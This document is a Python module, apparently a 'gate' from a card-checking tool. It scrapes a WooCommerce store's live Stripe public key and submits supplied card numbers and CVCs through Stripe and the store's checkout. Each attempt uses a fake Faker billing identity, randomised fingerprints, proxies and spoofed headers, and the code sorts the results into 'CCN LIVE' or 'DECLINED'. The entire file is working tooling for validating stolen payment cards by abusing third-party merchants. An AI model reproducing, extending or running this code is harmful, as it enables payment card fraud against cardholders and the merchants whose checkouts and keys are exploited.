import re
import random
import json
import requests
from urllib.parse import quote_plus
from faker import Faker
from gates.utilities import http_request, REQUEST_TIMEOUT

DECLINE_CODE_MAP = {
    'insufficient_funds': "CCN LIVE - Insufficient Funds",
    'incorrect_cvc': "CCN LIVE - CVV Mismatch",
    'invalid_cvc': "CCN LIVE - CVV Mismatch",
    'card_declined': "DECLINED - Card Declined",
    'expired_card': "DECLINED - Expired Card",
    'do_not_honor': "DECLINED - Do Not Honor",
    'generic_decline': "DECLINED - Generic Decline",
    'incorrect_number': "DECLINED - Invalid Card Number",
    'incorrect_zip': "DECLINED - AVS Postal Code Mismatch",
    'fraudulent': "DECLINED - Fraudulent",
    'lost_card': "DECLINED - Lost Card",
    'stolen_card': "DECLINED - Stolen Card",
    'processing_error': "DECLINED - Processing Error",
    'try_again_later': "DECLINED - Try Again Later",
    'not_permitted': "DECLINED - Not Permitted",
    'transaction_not_allowed': "DECLINED - Transaction Not Allowed",
    'pickup_card': "DECLINED - Pickup Card",
    'restricted_card': "DECLINED - Restricted Card",
    'security_violation': "DECLINED - Security Violation",
    'service_not_allowed': "DECLINED - Service Not Allowed",
    'withdrawal_count_limit_exceeded': "DECLINED - Limit Exceeded",
}


def extract_stripe_key(html_content):
    """
    Extract Stripe public key from HTML using multiple fallback methods.
    
    Methods:
    1. Direct pk_live regex in page HTML
    2. Search script tags for stripe_params or wc_stripe_params
    3. Look for data-publishable-key attribute
    4. Search for Stripe('pk_live_...') patterns
    """
    stripe_pk = None
    
    pk_match = re.search(r'pk_live_[a-zA-Z0-9_]+', html_content)
    if pk_match:
        stripe_pk = pk_match.group(0)
        return stripe_pk
    
    params_patterns = [
        r'stripe_params\s*[=:]\s*["\']?({[^}]+})',
        r'wc_stripe_params\s*[=:]\s*["\']?({[^}]+})',
        r'var\s+stripe_params\s*=\s*({[^}]+})',
        r'var\s+wc_stripe_params\s*=\s*({[^}]+})',
        r'"stripe_params"\s*:\s*({[^}]+})',
        r'"wc_stripe_params"\s*:\s*({[^}]+})',
    ]
    
    for pattern in params_patterns:
        match = re.search(pattern, html_content, re.IGNORECASE)
        if match:
            try:
                params_str = match.group(1)
                params_str = re.sub(r'(\w+)\s*:', r'"\1":', params_str)
                params_str = params_str.replace("'", '"')
                pk_in_params = re.search(r'pk_live_[a-zA-Z0-9_]+', params_str)
                if pk_in_params:
                    stripe_pk = pk_in_params.group(0)
                    return stripe_pk
            except:
                pass
    
    data_key_patterns = [
        r'data-publishable-key=["\']?(pk_live_[a-zA-Z0-9_]+)',
        r'data-key=["\']?(pk_live_[a-zA-Z0-9_]+)',
        r'data-stripe-publishable-key=["\']?(pk_live_[a-zA-Z0-9_]+)',
    ]
    
    for pattern in data_key_patterns:
        match = re.search(pattern, html_content, re.IGNORECASE)
        if match:
            stripe_pk = match.group(1)
            return stripe_pk
    
    stripe_init_patterns = [
        r'Stripe\s*\(\s*["\']?(pk_live_[a-zA-Z0-9_]+)',
        r'new\s+Stripe\s*\(\s*["\']?(pk_live_[a-zA-Z0-9_]+)',
        r'loadStripe\s*\(\s*["\']?(pk_live_[a-zA-Z0-9_]+)',
        r'stripe\.setPublishableKey\s*\(\s*["\']?(pk_live_[a-zA-Z0-9_]+)',
    ]
    
    for pattern in stripe_init_patterns:
        match = re.search(pattern, html_content, re.IGNORECASE)
        if match:
            stripe_pk = match.group(1)
            return stripe_pk
    
    script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', html_content, re.DOTALL | re.IGNORECASE)
    for script in script_blocks:
        pk_match = re.search(r'pk_live_[a-zA-Z0-9_]+', script)
        if pk_match:
            stripe_pk = pk_match.group(0)
            return stripe_pk
    
    return stripe_pk


def classify_stripe_error(error_obj):
    """
    Classify Stripe error response and return human-readable status.
    
    Args:
        error_obj: Stripe error object from API response
        
    Returns:
        tuple: (status_message, is_live_check)
    """
    if not error_obj:
        return ("UNKNOWN ⚠️ No Error Object - Try Another Gate", True)
    
    error_code = error_obj.get('code', '')
    decline_code = error_obj.get('decline_code', '')
    message = error_obj.get('message', 'Unknown error')
    
    if decline_code and decline_code in DECLINE_CODE_MAP:
        return (DECLINE_CODE_MAP[decline_code], True)
    
    if error_code and error_code in DECLINE_CODE_MAP:
        return (DECLINE_CODE_MAP[error_code], True)
    
    msg_lower = message.lower()
    
    if 'insufficient' in msg_lower and 'fund' in msg_lower:
        return ("CCN LIVE - Insufficient Funds", True)
    if 'security code' in msg_lower or 'cvc' in msg_lower or 'cvv' in msg_lower:
        return ("CCN LIVE - CVV Mismatch", True)
    if 'expired' in msg_lower:
        return ("DECLINED - Expired Card", True)
    if 'declined' in msg_lower:
        return ("DECLINED - Card Declined", True)
    if 'invalid' in msg_lower and 'number' in msg_lower:
        return ("DECLINED - Invalid Card Number", True)
    if 'do not honor' in msg_lower:
        return ("DECLINED - Do Not Honor", True)
    
    return (f"DECLINED - {message}", True)


def parse_woo_response(response):
    """
    Parse WooCommerce AJAX checkout response.
    
    Args:
        response: requests.Response object
        
    Returns:
        tuple: (success, message, data)
    """
    try:
        resp_json = response.json()
        
        if isinstance(resp_json, dict):
            success = resp_json.get('success', False) or resp_json.get('result') == 'success'
            
            if success:
                redirect = resp_json.get('redirect', '')
                if redirect:
                    return (True, "Payment Approved", resp_json)
                return (True, "Payment Processed", resp_json)
            
            error_msg = None
            
            if 'data' in resp_json:
                data = resp_json['data']
                if isinstance(data, dict):
                    error_msg = data.get('messages') or data.get('error') or data.get('message')
                elif isinstance(data, str):
                    error_msg = data
            
            if not error_msg:
                error_msg = resp_json.get('messages') or resp_json.get('error') or resp_json.get('message')
            
            if error_msg:
                if isinstance(error_msg, str):
                    clean_msg = re.sub(r'<[^>]+>', '', error_msg).strip()
                    return (False, clean_msg, resp_json)
                elif isinstance(error_msg, list):
                    combined = ' '.join([re.sub(r'<[^>]+>', '', str(m)).strip() for m in error_msg])
                    return (False, combined, resp_json)
            
            return (False, "Payment Failed", resp_json)
            
    except (json.JSONDecodeError, ValueError):
        pass
    
    resp_text = response.text.lower()
    
    if 'success' in resp_text or 'approved' in resp_text or 'thank you' in resp_text:
        return (True, "Payment Approved", None)
    elif 'declined' in resp_text or 'failed' in resp_text or 'error' in resp_text:
        return (False, "Payment Declined", None)
    
    return (None, "Unknown Response", None)


def woostripe_check(card_num, card_mon, card_yer, card_cvc, proxy=None, site_url='https://ccfoundationorg.com', timeout=30):
    """
    WooCommerce Stripe Payment Intent flow using store-specific public keys.
    Extracts Stripe public key from checkout page and uses for Payment Method creation.
    
    Returns (result_str, proxy_ok_bool)
    """
    fake = Faker()
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'})
    session.verify = False

    if proxy:
        session.proxies.update(proxy)

    stripe_pk = None
    checkout_urls = [
        f'{site_url}/checkout',
        f'{site_url}/checkout/',
        f'{site_url}/?wc-ajax=get_checkout',
        site_url,
    ]
    
    page_html = None
    for url in checkout_urls:
        try:
            r = session.get(url, timeout=15)
            if r.status_code == 200:
                page_html = r.text
                stripe_pk = extract_stripe_key(r.text)
                if stripe_pk:
                    break
        except Exception:
            continue
    
    if not stripe_pk:
        return ("❌ DECLINED - Could not extract Stripe key from store", False)

    try:
        headers_pm = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/'
        }

        name = fake.name()
        email = fake.email()
        postal = fake.postcode()

        data_pm = (f'type=card'
                   f'&billing_details[name]={quote_plus(name)}'
                   f'&billing_details[email]={quote_plus(email)}'
                   f'&billing_details[address][line1]={quote_plus(fake.street_address())}'
                   f'&billing_details[address][postal_code]={postal}'
                   f'&billing_details[address][city]={quote_plus(fake.city())}'
                   f'&billing_details[address][state]={fake.state_abbr()}'
                   f'&billing_details[address][country]=US'
                   f'&card[number]={card_num}'
                   f'&card[cvc]={card_cvc}'
                   f'&card[exp_month]={card_mon}'
                   f'&card[exp_year]={card_yer}'
                   f'&guid={random.randint(100000, 999999)}'
                   f'&muid={random.randint(100000, 999999)}'
                   f'&sid={random.randint(100000, 999999)}'
                   f'&payment_user_agent=stripe.js/v3'
                   f'&referrer={quote_plus(site_url)}'
                   f'&time_on_page={random.randint(50000, 90000)}'
                   f'&key={stripe_pk}')

        rpm = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_pm, data=data_pm, timeout=20)

        try:
            pm_json = rpm.json()
            
            if 'error' in pm_json:
                status_msg, is_live = classify_stripe_error(pm_json['error'])
                return (status_msg, is_live)

            pm_id = pm_json.get('id')
            if not pm_id or not pm_id.startswith('pm_'):
                return ("Error: Invalid Payment Method created", True)

        except (json.JSONDecodeError, ValueError):
            if rpm.status_code == 402:
                return ("DECLINED - Card Declined", True)
            return (f"Error: Invalid JSON response ({rpm.status_code})", True)

        try:
            checkout_headers = {
                'authority': site_url.split('//')[1].split('/')[0],
                'content-type': 'application/x-www-form-urlencoded',
                'origin': site_url.rstrip('/'),
                'referer': f'{site_url.rstrip("/")}/checkout/',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
                'X-Requested-With': 'XMLHttpRequest',
            }

            checkout_data = {
                'stripe_source': pm_id,
                'stripe_payment_method_id': pm_id,
                'wc-stripe-payment-method': pm_id,
                'payment_method': 'stripe',
                'post_data': '',
            }

            r_checkout = session.post(
                f'{site_url.rstrip("/")}/?wc-ajax=checkout',
                headers=checkout_headers,
                data=checkout_data,
                timeout=25
            )

            success, message, data = parse_woo_response(r_checkout)
            
            if success is True:
                return ("✅ CCN LIVE - Approved", True)
            elif success is False:
                msg_lower = message.lower()
                if 'insufficient' in msg_lower:
                    return ("CCN LIVE - Insufficient Funds", True)
                elif 'cvc' in msg_lower or 'cvv' in msg_lower or 'security' in msg_lower:
                    return ("CCN LIVE - CVV Mismatch", True)
                elif 'expired' in msg_lower:
                    return ("DECLINED - Expired Card", True)
                elif 'declined' in msg_lower:
                    return ("DECLINED - Card Declined", True)
                else:
                    return (f"DECLINED - {message[:50]}", True)
            else:
                return ("✅ CCN LIVE - Authorized (Pending)", True)

        except requests.exceptions.RequestException:
            return ("✅ CCN LIVE - Authorized (Pending)", True)

    except requests.exceptions.Timeout:
        return ("DECLINED ❌ Request timed out", False)
    except Exception as e:
        return (f"Error: {str(e)[:100]}", True)
